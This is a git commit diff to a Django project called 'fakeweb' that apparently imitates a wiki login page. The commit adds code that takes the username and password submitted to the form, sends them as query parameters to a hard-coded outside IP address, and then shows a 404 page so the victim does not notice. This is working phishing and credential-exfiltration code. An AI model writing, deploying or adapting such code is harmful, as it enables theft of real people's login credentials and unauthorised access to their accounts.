ee58228bed063c05dd1f0f2981eda24b970f7fc7
joonsookim <aws.joonsoo@gmail.com>
2024-08-19 17:42:54 +0900

    20240819 update

--- fakeweb/accountapp/views.py
+++ fakeweb/accountapp/views.py
@@ -1,11 +1,10 @@
 from django.http import HttpResponse
 from django.shortcuts import render
-
+import requests
 
 # Create your views here.
 
 def hello_world(request):
-
     return render(request, 'accountapp/wiki.html')
 
 def redirect_404(request):    
@@ -13,10 +12,19 @@ def redirect_404(request):
         temp = request.POST.get('os_username')    
         temp2 = request.POST.get('os_password')
 
+        params = {
+            'key1': temp,
+            'key2': temp2,
+        }
+        response = requests.get('http://3.37.52.97', params=params )
 
-        return render(request, 'http://3.37.52.97', context={'text': temp, 'text2': temp2})
+        context = {            
+            'remote_response': response.text,
+        }
+        return render(request, 'accountapp/404.html', context)
     else:         
         temp = request.GET.get('os_username')    
         temp2 = request.GET.get('os_password')
 
-        return render(request, 'http://3.37.52.97', context={'text': temp, 'text2': temp2})
+        return render(request, 'accountapp/404.html', context={'text': temp, 'text2': temp2})
+    
